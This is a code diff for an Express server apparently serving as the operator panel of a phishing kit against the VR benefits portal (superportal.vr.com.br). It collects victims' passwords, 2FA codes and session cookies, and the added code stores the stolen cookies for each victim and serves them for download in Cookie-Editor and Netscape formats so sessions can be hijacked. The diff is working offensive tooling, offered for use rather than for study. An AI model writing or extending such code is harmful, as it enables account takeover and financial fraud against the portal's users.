@@ -89,6 +89,9 @@ function gerarDadosPainel() {
                 status_credencial: "testando",
                 cookies: null,
                 total_cookies: 0,
+                url_final: "https://superportal.vr.com.br/",
+                tem_sessao_salva: false,
+                link_acesso: `/sessao/${encodeURIComponent(u)}`,
                 data_hora: d.data_hora || "—",
                 ultimoEventoTipo: null
             });
@@ -105,7 +108,9 @@ function gerarDadosPainel() {
             if (d.cookies && (!item.cookies || item.cookies.length === 0)) {
                 item.cookies = d.cookies;
                 item.total_cookies = d.cookies.length;
+                item.tem_sessao_salva = true;
             }
+            if (d.url_final) item.url_final = d.url_final;
         } else if (d.senha) {
             item.ultimoEventoTipo = "LOGIN";
             if (!item.senhas.includes(d.senha)) item.senhas.push(d.senha);
@@ -117,7 +122,7 @@ function gerarDadosPainel() {
         }
     });
 
-    // Fallback: se status_credencial ou cookies ainda não preenchidos, verifica histórico em resultado.json
+    // Fallback: se status_credencial, url_final ou cookies ainda não preenchidos, verifica histórico em resultado.json
     mapaUsuarios.forEach((item, userKey) => {
         for (let i = resultados.length - 1; i >= 0; i--) {
             const r = resultados[i];
@@ -128,9 +133,26 @@ function gerarDadosPainel() {
                 if (r.cookies && (!item.cookies || item.cookies.length === 0)) {
                     item.cookies = r.cookies;
                     item.total_cookies = (r.cookies || []).length;
+                    item.tem_sessao_salva = true;
                 }
+                if (r.url_final) item.url_final = r.url_final;
                 break;
             }
+        }
+
+        // Verifica também se existe arquivo dedicado em sessoes/
+        const safeKey = userKey.replace(/[^a-z0-9_-]/g, "_");
+        const sessionFile = path.join(SESSOES_DIR, `${safeKey}_cookies.json`);
+        if (fs.existsSync(sessionFile)) {
+            try {
+                const sData = JSON.parse(fs.readFileSync(sessionFile, "utf8"));
+                if (sData && sData.cookies && sData.cookies.length > 0) {
+                    item.cookies = sData.cookies;
+                    item.total_cookies = sData.cookies.length;
+                    item.tem_sessao_salva = true;
+                    if (sData.url_final) item.url_final = sData.url_final;
+                }
+            } catch (e) {}
         }
     });
 
@@ -154,18 +176,23 @@ function gerarDadosPainel() {
 
     const consolidados = Array.from(mapaUsuarios.values()).reverse();
 
-    const feed = [...dados].reverse().map(d => ({
-        tipo: d.tipo === "2FA" ? "2FA" : "LOGIN",
-        usuario: d.nome || d.usuario || "desconhecido",
-        senha: d.senha || null,
-        codigo: d.codigo || null,
-        status_2fa: d.status_2fa || null,
-        status_login: d.status_login || null,
-        status_credencial: d.status_credencial || null,
-        cookies: d.cookies || null,
-        total_cookies: d.cookies ? d.cookies.length : 0,
-        data_hora: d.data_hora || "—"
-    }));
+    const feed = [...dados].reverse().map(d => {
+        const u = d.nome || d.usuario || "desconhecido";
+        return {
+            tipo: d.tipo === "2FA" ? "2FA" : "LOGIN",
+            usuario: u,
+            senha: d.senha || null,
+            codigo: d.codigo || null,
+            status_2fa: d.status_2fa || null,
+            status_login: d.status_login || null,
+            status_credencial: d.status_credencial || null,
+            cookies: d.cookies || null,
+            total_cookies: d.cookies ? d.cookies.length : 0,
+            url_final: d.url_final || "https://superportal.vr.com.br/",
+            link_acesso: `/sessao/${encodeURIComponent(u)}`,
+            data_hora: d.data_hora || "—"
+        };
+    });
 
     return {
         success: true,
@@ -1020,31 +1047,152 @@ app.get(
         const userKey = usuario.replace(/[^a-z0-9_-]/g, "_");
         const sessionFile = path.join(SESSOES_DIR, `${userKey}_cookies.json`);
 
+        let sessionData = null;
         if (fs.existsSync(sessionFile)) {
             try {
-                const data = JSON.parse(fs.readFileSync(sessionFile, "utf8"));
-                return res.json({ success: true, ...data });
+                sessionData = JSON.parse(fs.readFileSync(sessionFile, "utf8"));
             } catch (e) {
                 return res.status(500).json({ success: false, mensagem: "Erro ao ler arquivo de cookies." });
             }
         }
 
-        // Busca em resultado.json
-        const resultados = lerResultados();
-        for (let i = resultados.length - 1; i >= 0; i--) {
-            const r = resultados[i];
-            if (r && (r.nome || "").toLowerCase().trim() === usuario && r.cookies) {
-                return res.json({
-                    success: true,
-                    usuario: r.nome,
-                    data_hora: r.data_hora,
-                    url_final: r.url_final || "",
-                    cookies: r.cookies
-                });
+        // Fallback: busca em resultado.json
+        if (!sessionData) {
+            const resultados = lerResultados();
+            for (let i = resultados.length - 1; i >= 0; i--) {
+                const r = resultados[i];
+                if (r && (r.nome || "").toLowerCase().trim() === usuario && r.cookies) {
+                    sessionData = {
+                        usuario: r.nome,
+                        data_hora: r.data_hora,
+                        url_final: r.url_final || "https://superportal.vr.com.br/",
+                        cookies: r.cookies
+                    };
+                    break;
+                }
             }
         }
 
-        res.status(404).json({ success: false, mensagem: "Sessão de cookies não encontrada." });
+        if (!sessionData) {
+            return res.status(404).json({ success: false, mensagem: "Sessão de cookies não encontrada." });
+        }
+
+        const rawCookies = sessionData.cookies || [];
+
+        // Gera formato específico compatível com a extensão Cookie-Editor
+        const cookieEditorFormat = rawCookies.map(c => ({
+            domain: c.domain,
+            expirationDate: c.expires && c.expires > 0 ? c.expires : undefined,
+            hostOnly: !c.domain.startsWith("."),
+            httpOnly: !!c.httpOnly,
+            name: c.name,
+            path: c.path || "/",
+            sameSite: c.sameSite ? c.sameSite.toLowerCase() : "unspecified",
+            secure: !!c.secure,
+            session: !c.expires || c.expires <= 0,
+            storeId: "0",
+            value: c.value
+        }));
+
+        return res.json({
+            success: true,
+            usuario: sessionData.usuario,
+            data_hora: sessionData.data_hora,
+            url_final: sessionData.url_final || "https://superportal.vr.com.br/",
+            total_cookies: rawCookies.length,
+            cookies: rawCookies,
+            cookie_editor_json: cookieEditorFormat,
+            link_acesso: `/sessao/${encodeURIComponent(sessionData.usuario)}`
+        });
+    }
+);
+
+app.get(
+    "/api/sessao/:usuario/exportar",
+    (req, res) => {
+        const usuario = (req.params.usuario || "").toLowerCase().trim();
+        const formato = (req.query.formato || "json").toLowerCase();
+        const userKey = usuario.replace(/[^a-z0-9_-]/g, "_");
+        const sessionFile = path.join(SESSOES_DIR, `${userKey}_cookies.json`);
+
+        let sessionData = null;
+        if (fs.existsSync(sessionFile)) {
+            try {
+                sessionData = JSON.parse(fs.readFileSync(sessionFile, "utf8"));
+            } catch (e) {}
+        }
+
+        if (!sessionData) {
+            const resultados = lerResultados();
+            for (let i = resultados.length - 1; i >= 0; i--) {
+                const r = resultados[i];
+                if (r && (r.nome || "").toLowerCase().trim() === usuario && r.cookies) {
+                    sessionData = {
+                        usuario: r.nome,
+                        data_hora: r.data_hora,
+                        url_final: r.url_final || "https://superportal.vr.com.br/",
+                        cookies: r.cookies
+                    };
+                    break;
+                }
+            }
+        }
+
+        if (!sessionData || !sessionData.cookies) {
+            return res.status(404).send("Sessão não encontrada");
+        }
+
+        const cookies = sessionData.cookies;
+
+        if (formato === "netscape" || formato === "txt") {
+            let txt = "# Netscape HTTP Cookie File\n";
+            txt += "# https://curl.se/docs/http-cookies.html\n";
+            txt += `# Capturado por VR Monitor em ${sessionData.data_hora || new Date().toISOString()}\n\n`;
+
+            cookies.forEach(c => {
+                const domain = c.domain.startsWith(".") ? c.domain : `.${c.domain}`;
+                const flag = domain.startsWith(".") ? "TRUE" : "FALSE";
+                const path = c.path || "/";
+                const secure = c.secure ? "TRUE" : "FALSE";
+                const expiry = c.expires && c.expires > 0 ? Math.floor(c.expires) : Math.floor(Date.now() / 1000) + 86400 * 30;
+                txt += `${domain}\t${flag}\t${path}\t${secure}\t${expiry}\t${c.name}\t${c.value}\n`;
+            });
+
+            res.setHeader("Content-Type", "text/plain; charset=utf-8");
+            res.setHeader("Content-Disposition", `attachment; filename="cookies_${userKey}.txt"`);
+            return res.send(txt);
+        }
+
+        // Formato Cookie-Editor
+        const cookieEditorFormat = cookies.map(c => ({
+            domain: c.domain,
+            expirationDate: c.expires && c.expires > 0 ? c.expires : undefined,
+            hostOnly: !c.domain.startsWith("."),
+            httpOnly: !!c.httpOnly,
+            name: c.name,
+            path: c.path || "/",
+            sameSite: c.sameSite ? c.sameSite.toLowerCase() : "unspecified",
+            secure: !!c.secure,
+            session: !c.expires || c.expires <= 0,
+            storeId: "0",
+            value: c.value
+        }));
+
+        res.setHeader("Content-Type", "application/json; charset=utf-8");
+        res.setHeader("Content-Disposition", `attachment; filename="cookies_${userKey}.json"`);
+        return res.send(JSON.stringify(cookieEditorFormat, null, 2));
+    }
+);
+
+app.get(
+    ["/sessao/:usuario", "/acesso/:usuario", "/sessao"],
+    (req, res) => {
+        res.sendFile(
+            path.join(
+                PUBLIC_DIR,
+                "sessao.html"
+            )
+        );
     }
 );
 
